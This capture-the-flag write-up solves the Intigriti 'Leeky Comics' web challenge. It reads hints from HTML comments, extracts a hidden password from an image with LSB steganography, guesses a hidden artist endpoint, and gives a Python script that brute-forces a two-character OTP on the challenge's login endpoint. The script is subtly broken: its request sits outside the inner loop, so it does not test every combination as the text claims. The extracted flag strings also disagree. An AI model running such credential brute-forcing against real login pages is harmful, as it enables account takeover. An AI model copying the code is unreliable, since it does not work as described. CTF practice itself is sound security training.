# Leeky Comics
> Check out Dr Leek's new comic store! 👨‍⚕️

## About the Challenge
We were given a website that will generate some images and then we can sign our input to the image


[Image extracted text: [Image processing failed]]


## How to Solve?
If we check the source code by pressing `Ctrl + U` there are 2 comments:

```html
<!-- If you forget the password remember that our admin hid it somewhere in the image with some random python lib -->
```

and

```html
<!-- TODO: Hide the endpoint for the artists -->
```

It looks like this some steganography challs. So I decided to download the generated image and upload it into this [website](https://stegonline.georgeom.net/upload) and then choose `Extract Data` option

The flag is hidden using the LSB steganography technique. Choose row `0` and press `Go` button


[Image extracted text: Extract Data
Here you can extract data hidden inside of the image. Select some bits and adjust the
settings appropriately. The final extracted data is checked against some basic file
headers_
and so the filetype can be automatically determined 
Please note that Alpha options are only available if the image contains transparency:
5
4
3
2
Pixel Order
Bit Order
Bit Plane Order
Trim Trailing Bits
Row
MSB
No
Go
Results
No file types identified
The results below only show the first 2500 bytes. Select "Download" to obtain the
full data.
Ascii (readable only):
32 : passw
ord:Mich
3l@ngelo
sistln3!
511?_
Hex (Accurate):
33323a70617373776f72643a4d696368336c406e67656c3024697374316e33213531
313ffffffffffffffffffffffffffffffff
fffffffffe38fffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
Download Extracted Data]


As you can see, we got 2 digit numbers and also the password

```
32:password:Mich3l@ngel0$ist1n3!511?
```

If we go to check the second HTML comment, it appears that there's another endpoint. I obtained it by guessing, and the endpoint is `/artist`.


[Image extracted text: Artist Login
Username:
Password:
OTP (enter your 2 digit pin):
Login]


We need to input the username (You can get it from the hints), password, and the OTP code. At first I tried to input this:

```
Username: Picasso
Password: Mich3l@ngel0$ist1n3!511
OTP Code: 32
```

But the output was `Incorrect Login`. In this case, I tried to create another python script to bruteforce the OTP code. Here is the code I used to brute the OTP code

```python
import requests

url = "https://leekycomics.ctf.intigriti.io/artist_login"

characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

username = "Picasso"
password = "Mich3l@ngel0$ist1n3!511"

for char1 in characters:
    for char2 in characters:
        otp = char1 + char2
        data = {
            "username": username,
            "password": password,
            "otp": otp
        }

    response = requests.post(url, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})

    if response.status_code == 200:
        # Print the cookies from the response
        print(f"OTP: {otp}, Cookies: {response.text}")
    else:
        print(f"OTP: {otp}, Response Status Code: {response.text}")
```

And then run the code and voilà (In this case im using grep to get the flag)


[Image extracted text: OTP:
01,
Cookies:
Good
job
here
is
your
FLG INTIGRITI{Sup3r_53cr37_f146_dr_133k_reck5}
flag]


```
INTIGRITI{5up3r_53cr37_fl46_dr_l33k_r0ck5}
```